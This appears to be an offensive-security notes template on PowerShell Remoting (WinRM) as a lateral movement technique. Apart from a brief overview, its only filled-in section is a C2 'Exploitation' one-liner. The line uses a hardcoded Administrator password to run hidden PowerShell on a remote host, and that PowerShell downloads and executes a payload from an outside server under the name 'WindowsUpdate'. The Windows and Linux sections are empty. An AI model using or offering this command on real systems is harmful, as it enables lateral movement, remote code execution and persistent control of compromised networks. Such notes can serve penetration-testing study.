
### Technique Overview
PowerShell Remoting uses Windows Remote Management (WinRM) to allow users to run PowerShell commands on remote computers.
- Window remoting is another popular remote administration method.

1 Attacker to Many Hosts = WinRM
- The benefit of Windows Remoting over RDP is that it allows to make changes at scale, instead of having to do everything manually one by one. It should come as no surprise that it is also a popular lateral movement technique for adversaries!

OPSEC

# C2
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```powershell
powershell $pspassword=ConvertTo-SecureString "sup3rs3cr3tP@ssw0rd!!" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential("FS01\Administrator",$pspassword);Invoke-Command -ComputerName fs01 -Credential $cred -ScriptBlock {powershell.exe -nop -w hidden -c "IEX(irm -useb 'http://10.130.4.100:8888/WindowsUpdate')"}
```

---
# Windows
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```

----
# Linux
## Overview 

```markdown
```
## Enumeration 

```markdown
```

## Exploitation 

```markdown
```
